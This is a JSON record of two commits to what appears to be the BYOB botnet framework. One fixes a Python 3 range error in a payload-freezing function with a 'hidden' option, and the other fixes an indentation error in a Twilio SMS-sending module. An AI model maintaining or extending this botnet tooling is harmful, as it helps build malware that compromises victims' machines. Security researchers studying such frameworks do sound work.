{
  "repo_name": "malwaredllc/byob",
  "commits": [
    {
      "sha": "1d6e0664372fc34e2237c0944b2bf156d69ca8c5",
      "message": "fixed TypeError in generators.py\n\nfixed TypeError: unsupported operand type(s) for +: 'range' and 'range",
      "changes": [
        {
          "file": "byob/core/generators.py",
          "patch": "@@ -206,7 +206,7 @@ def freeze(filename, icon=None, hidden=None):\n     basename = os.path.basename(filename)\n     name = os.path.splitext(basename)[0]\n     path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\\\','/')\n-    key = ''.join([random.choice([chr(i) for i in range(48,91) + range(97,123)]) for _ in range(16)])\n+    key = ''.join([random.choice([chr(i) for i in list(range(48,91)) + list(range(97,123))]) for _ in range(16)])\n \n     imports = []\n     with open(filename) as import_file:"
        }
      ]
    },
    {
      "sha": "ee4286b0888257f4f4c68815f0795038720c523c",
      "message": "Fix the IndentationError on the if / else\n\n```\r\n./byob/modules/phone.py:39:9: E999 SyntaxError: invalid syntax\r\n\t    else:\r\n        ^\r\n```",
      "changes": [
        {
          "file": "byob/modules/phone.py",
          "patch": "@@ -32,11 +32,12 @@\n def run(message=None, number=None, sid=None, token=None):\n     try:\n         if 'twilio' in globals():\n+            global twilio\n             phone_number = '+{}'.format(str().join([i for i in str(number) if str(i).isdigit()]))\n             cli = twilio.rest.Client(sid, token)\n             msg = cli.api.account.messages.create(to=phone_number, from_=phone, body=message)\n             return \"SUCCESS: text message sent to {}\".format(phone_number)\n-\t    else:\n+        else:\n             raise ImportError(\"missing package 'twilio' is required for module 'phone'\")\n     except Exception as e:\n         return \"{} error: {}\".format(run.func_name, str(e))"
        }
      ]
    }
  ]
}